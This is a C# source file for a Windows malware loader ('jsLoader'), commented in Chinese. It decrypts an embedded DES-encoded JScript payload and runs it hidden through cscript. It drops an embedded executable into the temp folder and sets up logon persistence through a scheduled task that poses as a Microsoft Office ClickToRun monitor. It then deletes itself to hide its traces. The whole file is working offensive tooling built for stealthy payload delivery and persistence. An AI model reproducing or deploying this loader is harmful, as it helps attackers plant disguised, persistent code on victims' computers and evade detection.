using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using TaskScheduler;

namespace jsLoader
{
    class Program
    {
        static string v1gf8hg16cx1d = "要释放的js，可以先用des加密再放进来";
        static string gh216f9ghj156 = Decode(v1gf8hg16cx1d);
        public static string Decode(string data)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("key");
            byte[] bytes2 = Encoding.ASCII.GetBytes("IV");
            byte[] buffer;
            try
            {
                buffer = System.Convert.FromBase64String(data);
            }
            catch
            {
                return null;
            }
            DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
            MemoryStream stream = new MemoryStream(buffer);
            CryptoStream stream2 = new CryptoStream(stream, descryptoServiceProvider.CreateDecryptor(bytes, bytes2), CryptoStreamMode.Read);
            StreamReader streamReader = new StreamReader(stream2);
            return streamReader.ReadToEnd();
        }
        static void Main(string[] args)
        {
            //这边随便写写释放文件的方法
            string allowedChars = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ0123456789";
            int passwordLength = 32;
            char[] chars = new char[passwordLength];
            char[] charss = new char[passwordLength];
            Random rd = new Random();

            for (int i = 0; i < passwordLength; i++)
            {
                chars[i] = allowedChars[rd.Next(0, allowedChars.Length)];
            }
            for (int i = 0; i < passwordLength; i++)
            {
                charss[i] = allowedChars[rd.Next(0, allowedChars.Length)];
            }

            string pwd = new string(chars);
            string pwd2 = new string(charss);

            try
            {
                byte[] byDll = global::jsLoader.Properties.Resource1.test;  //把自启动要运行的文件放到resource里面，然后这边会导出
                string strPath = Path.GetTempPath() + @"\" + pwd2 + ".exe";//设置释放路径
                                                                           //创建文件（覆盖模式）
                using (FileStream fs = new FileStream(strPath, FileMode.Create))
                {
                    fs.Write(byDll, 0, byDll.Length);
                }
                StreamWriter sw = new StreamWriter(Path.GetTempPath() + "/" + pwd + ".tmp");
                sw.Write(gh216f9ghj156);
                sw.Flush();
                sw.Close();
                Process CmdProcess = new Process();
                CmdProcess.StartInfo.FileName = "cscript.exe";
                CmdProcess.StartInfo.CreateNoWindow = true;  
                CmdProcess.StartInfo.UseShellExecute = false;   
                CmdProcess.StartInfo.RedirectStandardInput = true;
                CmdProcess.StartInfo.RedirectStandardOutput = true; 
                CmdProcess.StartInfo.RedirectStandardError = true;  
                CmdProcess.StartInfo.Arguments = "/e:JScript " + Path.GetTempPath() + "/" + pwd + ".tmp";
                CmdProcess.Start();
                CmdProcess.WaitForExit();
                CmdProcess.Close();
				//运行完就把文件删掉，自启动的文件运行时重新释放出来
                if (File.Exists(Path.GetTempPath() + "/" + pwd + ".tmp"))
                {
                    try
                    {
                        File.Delete(Path.GetTempPath() + "/" + pwd + ".tmp");
                    }
                    catch (System.IO.IOException e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
				//新建计划任务
                TaskSchedulerClass scheduler = new TaskSchedulerClass();
                //连接
                scheduler.Connect(null, null, null, null);
                //获取创建任务的目录
                ITaskFolder folder = scheduler.GetFolder("\\");
                //设置参数
                ITaskDefinition task = scheduler.NewTask(0);
                task.RegistrationInfo.Author = "Microsoft Office";//创建者
                task.RegistrationInfo.Description = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.";//描述
                                                            //设置触发机制（此处是 登陆后）
                task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                //设置动作（此处为运行exe程序）
                IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                action.Path = Path.GetTempPath() + @"\" + pwd2 + ".exe";//设置文件目录
                task.Settings.ExecutionTimeLimit = "PT0S"; //运行任务时间超时停止任务吗? PTOS 不开启超时
                task.Settings.DisallowStartIfOnBatteries = false;//只有在交流电源下才执行
                task.Settings.RunOnlyIfIdle = false;//仅当计算机空闲下才执行

                IRegisteredTask regTask =
                    folder.RegisterTaskDefinition("Office ClickToRun Service Monitor", task,//此处需要设置任务的名称（name）
                    (int)_TASK_CREATION.TASK_CREATE, null, //user
                    null, // password
                    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                    "");
                IRunningTask runTask = regTask.Run(null);
                Console.WriteLine("OK");
                //运行后自杀
                string s = Process.GetCurrentProcess().MainModule.FileName;
                Process.Start("Cmd.exe", "/c del " + "\"" + s + "\"");
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }
}
